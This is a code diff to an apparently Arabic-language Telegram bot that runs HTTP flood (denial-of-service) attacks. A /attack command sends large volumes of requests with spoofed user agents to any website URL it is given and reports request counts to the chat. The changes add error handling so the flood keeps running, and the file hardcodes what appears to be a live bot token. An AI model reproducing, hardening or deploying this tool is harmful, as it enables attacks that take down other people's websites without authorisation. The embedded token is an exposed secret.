@@ -1,6 +1,7 @@
 import asyncio
 import aiohttp
 import random
+import time  # تمت إضافته
 from fake_useragent import UserAgent
 import telebot
 from urllib.parse import urlparse
@@ -48,7 +49,7 @@ class AttackManager:
                     await response.read()
                     self.request_count += 1
                     
-                    # إرسال التقرير مرة واحدة فقط بعد 1000 طلب
+                    # إرسال التقرير مرة واحدة فقط بعد 10000 طلب
                     if self.request_count > 10000 and not REPORT_SENT:
                         REPORT_SENT = True
                         duration = int(time.time() - self.start_time)
@@ -80,6 +81,8 @@ async def run_attack(target, bot, chat_id):
     manager = AttackManager(bot, chat_id)
     try:
         await manager.start_attack(target, MAX_THREADS)
+    except Exception as e:
+        print(f"Error in run_attack: {str(e)}")
     finally:
         await manager.cleanup()
         # إرسال تقرير الإيقاف النهائي
@@ -88,15 +91,20 @@ async def run_attack(target, bot, chat_id):
             report = (
                 f"🛑 توقف غير متوقع:\n"
                 f"• إجمالي الطلبات: {manager.request_count}\n"
-                f"• المدة الكلية: {duration} ثانية"
+                f"• المدة الكلية: {duration} ثانية\n"
+                f"• السبب: خطأ في الاتصال"
             )
             await bot.send_message(chat_id, report)
 
 def start_attack_thread(target, bot, chat_id):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(run_attack(target, bot, chat_id))
-    loop.close()
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(run_attack(target, bot, chat_id))
+    except Exception as e:
+        print(f"Error in start_attack_thread: {str(e)}")
+    finally:
+        loop.close()
 
 # إعداد بوت التليجرام
 bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")
@@ -127,6 +135,8 @@ def handle_attack(message):
         )
     except IndexError:
         bot.reply_to(message, "الاستخدام: /attack [رابط الموقع]")
+    except Exception as e:
+        bot.reply_to(message, f"حدث خطأ: {str(e)}")
 
 @bot.message_handler(commands=['stop'])
 def handle_stop(message):
@@ -135,4 +145,7 @@ def handle_stop(message):
     bot.reply_to(message, "🛑 تم إيقاف الاختبار بنجاح")
 
 if __name__ == "__main__":
-    bot.polling()
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(f"Error in main: {str(e)}")
